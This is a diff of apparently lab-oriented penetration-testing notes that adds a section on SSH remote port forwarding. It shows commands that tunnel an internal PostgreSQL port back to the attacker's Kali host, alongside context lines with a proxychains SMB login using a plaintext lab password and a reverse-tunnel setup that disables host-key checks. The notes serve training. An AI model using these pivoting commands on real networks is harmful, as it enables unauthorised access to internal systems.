@@ -70,6 +70,45 @@ proxychains smbclient -L //172.16.50.217/ -U hr_admin --password=Welcome1234
 proxychains nmap -vvv -sT --top-ports=20 -Pn 172.16.50.217
 ```
 
+## SSH Remote Port Forwarding
+
+While in local and dynamic port forwarding, the listening port is bound to the SSH client, in remote port forwarding, the listening port is bound to the SSH server. Instead of the packet forwarding being done by the SSH server, in remote port forwarding, packets are forwarded by the SSH client.
+
+```
+sudo systemctl start ssh
+```
+
+{% code title="Checking that the SSH server on the Kali machine is listening." overflow="wrap" lineNumbers="true" %}
+```
+sudo ss -ntplu
+```
+{% endcode %}
+
+The SSH remote port forward option is -R, and has a very similar syntax to the local port forward option. It also takes two socket pairs as the argument. The listening socket is defined first, and the forwarding socket is second.
+
+In this case, we want to listen on port 2345 on our Kali machine (127.0.0.1:2345), and forward all traffic to the PostgreSQL port on PGDATABASE01 (10.4.50.215:5432).
+
+```
+ssh -N -R 127.0.0.1:2345:10.4.50.215:5432 kali@192.168.118.4
+```
+
+{% code title="Checking if port 2345 is bound on the Kali SSH server." overflow="wrap" lineNumbers="true" %}
+```
+kali@kali:~$ ss -ntplu
+Netid State  Recv-Q Send-Q Local Address:Port Peer Address:PortProcess
+tcp   LISTEN 0      128        127.0.0.1:2345      0.0.0.0:*
+tcp   LISTEN 0      128          0.0.0.0:22        0.0.0.0:*
+tcp   LISTEN 0      128             [::]:22           [::]:*
+
+```
+{% endcode %}
+
+{% hint style="info" %}
+In order to connect back to the Kali SSH server using a username and password you may have to explicity allow password-based authentication by setting PasswordAuthentication to yes in /etc/ssh/sshd\_config.
+{% endhint %}
+
+
+
 ## Reverse tunnel to attack host
 
 UserKnownHostsFile=/dev/null and StrictHostKeyChecking=no. The first option prevents ssh from attempting to save the host key by sending the output to /dev/null. The second option will instruct ssh to not prompt us to accept the host key. Both of these options can be set via the -o flag.
